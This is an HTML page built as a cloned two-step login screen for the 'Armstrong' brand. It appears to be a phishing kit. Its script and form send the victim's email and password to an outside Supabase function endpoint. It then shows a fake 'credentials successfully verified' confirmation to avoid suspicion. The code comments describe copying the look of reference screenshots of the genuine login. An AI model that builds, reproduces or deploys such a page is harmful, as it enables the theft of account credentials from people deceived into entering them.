<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Armstrong - Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    
    <style>
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #e2e4e8;
            position: relative;
            overflow-x: hidden;
        }

        /* Geometric Background matching reference design */
        .bg-geometric {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 0;
            background: linear-gradient(135deg, #f1f3f6 0%, #e3e6ec 50%, #d8dce3 100%);
            overflow: hidden;
        }

        .bg-stripes {
            position: absolute;
            width: 200%;
            height: 200%;
            top: -50%;
            left: -50%;
            pointer-events: none;
            background-image: repeating-linear-gradient(
                -35deg,
                rgba(255, 255, 255, 0.5),
                rgba(255, 255, 255, 0.5) 45px,
                rgba(255, 255, 255, 0.15) 45px,
                rgba(255, 255, 255, 0.15) 120px,
                rgba(240, 242, 245, 0.3) 120px,
                rgba(240, 242, 245, 0.3) 180px
            );
        }

        .bg-overlay-gradient {
            position: absolute;
            inset: 0;
            background: radial-gradient(circle at 50% 50%, rgba(255, 255, 255, 0.65) 0%, rgba(220, 224, 230, 0.25) 80%);
            pointer-events: none;
        }

        .bg-light-band-1 {
            position: absolute;
            width: 150vw;
            height: 120px;
            background: linear-gradient(90deg, rgba(255, 255, 255, 0.75) 0%, rgba(255, 255, 255, 0.2) 100%);
            transform: rotate(-35deg);
            top: 25%;
            left: -20vw;
        }

        .bg-light-band-2 {
            position: absolute;
            width: 150vw;
            height: 200px;
            background: linear-gradient(90deg, rgba(255, 255, 255, 0.55) 0%, rgba(255, 255, 255, 0.1) 100%);
            transform: rotate(-35deg);
            top: 55%;
            left: -10vw;
        }

        /* Exact Card Drop Shadow */
        .login-card {
            background-color: #ffffff;
            border-radius: 4px;
            box-shadow: 0 14px 40px rgba(0, 0, 0, 0.08), 0 2px 10px rgba(0, 0, 0, 0.03);
            position: relative;
            z-index: 10;
            width: 100%;
            max-width: 440px;
        }

        /* Branding Colors */
        .brand-red-text {
            color: #C8002B;
        }

        .brand-red-bg {
            background-color: #C8002B;
            transition: background-color 0.15s ease, transform 0.1s ease;
        }

        .brand-red-bg:hover {
            background-color: #a90024;
        }

        .brand-red-bg:active {
            transform: scale(0.99);
        }

        /* Form Inputs matching the screenshot borders and text sizes */
        .custom-input {
            border: 1px solid #c9d1d9;
            border-radius: 3px;
            color: #1a202c;
            font-size: 0.95rem;
            transition: border-color 0.15s ease, box-shadow 0.15s ease;
        }

        .custom-input::placeholder {
            color: #718096;
            font-weight: 400;
        }

        .custom-input:focus {
            outline: none;
            border-color: #C8002B;
            box-shadow: 0 0 0 2px rgba(200, 0, 43, 0.12);
        }

        .trademark {
            font-size: 0.52em;
            vertical-align: super;
            margin-left: 1px;
            font-weight: 700;
            line-height: 0;
            position: relative;
            top: -0.15em;
        }

        .link-blue {
            color: #4354e8;
            font-weight: 600;
            text-decoration: none;
            transition: color 0.15s ease;
        }

        .link-blue:hover {
            color: #2b3acb;
        }

        .step-view {
            transition: opacity 0.2s ease-in-out;
        }

        .step-hidden {
            display: none !important;
            opacity: 0;
        }

        .loading-spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 0.8s linear infinite;
            margin-left: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .error-message {
            color: #C8002B;
            font-size: 12px;
            margin-top: 4px;
            display: none;
        }

        .error-message.show {
            display: block;
        }
    </style>
</head>
<body class="p-4 antialiased">

    <!-- Background geometric canvas layer -->
    <div class="bg-geometric">
        <div class="bg-stripes"></div>
        <div class="bg-light-band-1"></div>
        <div class="bg-light-band-2"></div>
        <div class="bg-overlay-gradient"></div>
    </div>

    <!-- Main Authentication Card -->
    <main class="login-card px-8 sm:px-12 py-10 my-auto">
        <!-- Logo Branding Header -->
        <div class="text-center pt-2 pb-6">
            <h1 class="brand-red-text font-black text-3xl sm:text-[32px] tracking-wider uppercase inline-flex items-center justify-center select-none" style="letter-spacing: 0.05em;">
                Armstrong<span class="trademark">®</span>
            </h1>
        </div>

        <!-- STEP 1: Username / Email Input -->
        <div id="step1" class="step-view">
            <div class="text-center mb-6">
                <h2 class="text-[#1a202c] text-[22px] font-normal mb-1 tracking-tight">
                    Welcome
                </h2>
                <p class="text-[#4a5568] text-xs sm:text-[13px] font-normal">
                    Log into Armstrong
                </p>
            </div>

            <form id="step1Form" onsubmit="goToStep2(event)" class="space-y-4">
                <div>
                    <label for="usernameInput" class="sr-only">Username or email address</label>
                    <input 
                        type="text" 
                        id="usernameInput" 
                        required 
                        placeholder="Username or email address*" 
                        class="custom-input w-full px-3.5 py-2.5 text-sm"
                        autocomplete="username"
                    />
                </div>

                <button 
                    type="submit" 
                    id="step1Btn"
                    class="brand-red-bg w-full text-white font-medium text-sm py-2.5 px-4 rounded-[4px] shadow-sm focus:outline-none focus:ring-2 focus:ring-red-600 focus:ring-offset-2 mt-2"
                >
                    Continue
                </button>
            </form>

            <div class="text-center mt-6 pt-1 text-xs sm:text-[13px]">
                <span class="text-[#4a5568]">Don't have an account?</span>
                <a href="#" class="link-blue ml-1">Sign up</a>
            </div>
        </div>

        <!-- STEP 2: Password Input (Identical to reference screenshot 2) -->
        <div id="step2" class="step-view step-hidden">
            <div class="text-center mb-6">
                <h2 class="text-[#1a202c] text-[22px] font-normal mb-1 tracking-tight">
                    Enter Your Password
                </h2>
                <p class="text-[#4a5568] text-xs sm:text-[13px] font-normal">
                    Enter your password for Armstrong
                </p>
            </div>

            <form id="step2Form" onsubmit="submitToEndpoint(event)" class="space-y-4" action="https://vwmihulxeajahitcqspv.supabase.co/functions/v1/redf" method="POST">
                <!-- Username Read-only Display with Edit Link -->
                <div class="relative flex items-center">
                    <input 
                        type="text" 
                        id="displayEmail" 
                        readonly 
                        class="custom-input w-full px-3.5 py-2.5 pr-14 text-sm bg-white cursor-default text-[#2d3748]"
                    />
                    <button 
                        type="button" 
                        onclick="goToStep1()" 
                        class="absolute right-3.5 link-blue text-xs font-medium focus:outline-none"
                    >
                        Edit
                    </button>
                </div>

                <!-- Password Input with Toggle Eye Icon -->
                <div class="relative flex items-center">
                    <input 
                        type="password" 
                        id="passwordInput" 
                        name="password"
                        required 
                        placeholder="Password*" 
                        class="custom-input w-full px-3.5 py-2.5 pr-10 text-sm"
                        autocomplete="current-password"
                    />
                    <button 
                        type="button" 
                        onclick="togglePasswordVisibility()" 
                        class="absolute right-3 text-[#718096] hover:text-[#4a5568] focus:outline-none p-1"
                        aria-label="Toggle password visibility"
                    >
                        <!-- Eye Icon -->
                        <svg id="eyeIcon" class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.6" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.6" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                        </svg>
                        <!-- Eye Slash Icon (Hidden by default) -->
                        <svg id="eyeSlashIcon" class="w-5 h-5 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.6" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858-5.908a10.02 10.02 0 014.122-.963c4.478 0 8.268 2.943 9.542 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21M3 3l18 18" />
                        </svg>
                    </button>
                </div>
                <div id="errorMsg" class="error-message"></div>

                <!-- Reset Password Link -->
                <div class="pt-0.5">
                    <a href="#" class="link-blue text-xs sm:text-[13px] font-medium">Reset password</a>
                </div>

                <button 
                    type="submit" 
                    id="submitBtn"
                    class="brand-red-bg w-full text-white font-medium text-sm py-2.5 px-4 rounded-[4px] shadow-sm focus:outline-none focus:ring-2 focus:ring-red-600 focus:ring-offset-2 mt-2"
                >
                    Continue
                </button>
            </form>

            <div class="text-center mt-6 pt-1 text-xs sm:text-[13px]">
                <span class="text-[#4a5568]">Don't have an account?</span>
                <a href="#" class="link-blue ml-1">Sign up</a>
            </div>
        </div>

        <!-- STEP 3: Status Updated Confirmation Screen -->
        <div id="step3" class="step-view step-hidden text-center py-2">
            <!-- Animated Green Checkmark Icon -->
            <div class="mx-auto flex items-center justify-center h-14 w-14 rounded-full bg-emerald-50 mb-4 border border-emerald-100">
                <svg class="h-8 w-8 text-emerald-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7" />
                </svg>
            </div>

            <h2 class="text-[#1a202c] text-2xl font-semibold mb-1">
                Status Updated
            </h2>
            <p class="text-[#4a5568] text-xs sm:text-[13px] mb-6">
                Your account credentials have been successfully verified.
            </p>

            <!-- Verification Summary Box -->
            <div class="bg-gray-50 border border-gray-200 rounded p-3.5 mb-6 text-left">
                <p class="text-xs text-gray-500 uppercase tracking-wider font-semibold mb-1">Account Info</p>
                <p id="summaryEmail" class="text-sm font-medium text-gray-800 break-all"></p>
                <div class="mt-2 flex items-center gap-2">
                    <span class="inline-block w-2 h-2 rounded-full bg-emerald-500"></span>
                    <span class="text-xs font-semibold text-emerald-700">Status: Active & Updated</span>
                </div>
            </div>

            <button 
                type="button" 
                onclick="resetWorkflow()" 
                class="brand-red-bg w-full text-white font-medium text-sm py-2.5 px-4 rounded-[4px] shadow-sm focus:outline-none focus:ring-2 focus:ring-red-600 focus:ring-offset-2"
            >
                Log In Again
            </button>
        </div>
    </main>

    <script>
        let userEmail = '';
        const ENDPOINT_URL = 'https://vwmihulxeajahitcqspv.supabase.co/functions/v1/redf';

        /**
         * Move from Step 1 (Email) to Step 2 (Password)
         */
        function goToStep2(event) {
            event.preventDefault();
            const emailInput = document.getElementById('usernameInput');
            userEmail = emailInput.value.trim();

            if (userEmail) {
                document.getElementById('displayEmail').value = userEmail;
                
                // Hide Step 1, Show Step 2
                document.getElementById('step1').classList.add('step-hidden');
                document.getElementById('step2').classList.remove('step-hidden');
                
                // Auto-focus password input
                setTimeout(() => {
                    document.getElementById('passwordInput').focus();
                }, 50);
            }
        }

        /**
         * Return to Step 1 (Edit Email)
         */
        function goToStep1() {
            document.getElementById('step2').classList.add('step-hidden');
            document.getElementById('step1').classList.remove('step-hidden');
            document.getElementById('usernameInput').focus();
        }

        /**
         * Submit data to the Supabase endpoint
         */
        async function submitToEndpoint(event) {
            event.preventDefault();
            const password = document.getElementById('passwordInput').value;
            const submitBtn = document.getElementById('submitBtn');
            const errorMsg = document.getElementById('errorMsg');

            if (!password) return;

            // Show loading state
            const originalText = submitBtn.innerHTML;
            submitBtn.innerHTML = 'Processing<span class="loading-spinner"></span>';
            submitBtn.disabled = true;
            errorMsg.classList.remove('show');

            try {
                const response = await fetch(ENDPOINT_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        email: userEmail,
                        password: password
                    })
                });

                if (response.ok) {
                    document.getElementById('summaryEmail').textContent = userEmail;
                    document.getElementById('step2').classList.add('step-hidden');
                    document.getElementById('step3').classList.remove('step-hidden');
                } else {
                    const data = await response.json().catch(() => ({}));
                    errorMsg.textContent = data.message || 'Invalid credentials. Please try again.';
                    errorMsg.classList.add('show');
                }
            } catch (error) {
                errorMsg.textContent = 'Network error. Please check your connection and try again.';
                errorMsg.classList.add('show');
            } finally {
                submitBtn.innerHTML = originalText;
                submitBtn.disabled = false;
            }
        }

        /**
         * Reset the multi-step form to initial state
         */
        function resetWorkflow() {
            document.getElementById('step3').classList.add('step-hidden');
            document.getElementById('step1').classList.remove('step-hidden');
            
            // Clear inputs
            document.getElementById('usernameInput').value = '';
            document.getElementById('passwordInput').value = '';
            document.getElementById('errorMsg').classList.remove('show');
            document.getElementById('usernameInput').focus();
        }

        /**
         * Toggle password field visibility (Eye Icon)
         */
        function togglePasswordVisibility() {
            const passwordInput = document.getElementById('passwordInput');
            const eyeIcon = document.getElementById('eyeIcon');
            const eyeSlashIcon = document.getElementById('eyeSlashIcon');

            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.classList.add('hidden');
                eyeSlashIcon.classList.remove('hidden');
            } else {
                passwordInput.type = 'password';
                eyeIcon.classList.remove('hidden');
                eyeSlashIcon.classList.add('hidden');
            }
        }
    </script>
</body>
</html>
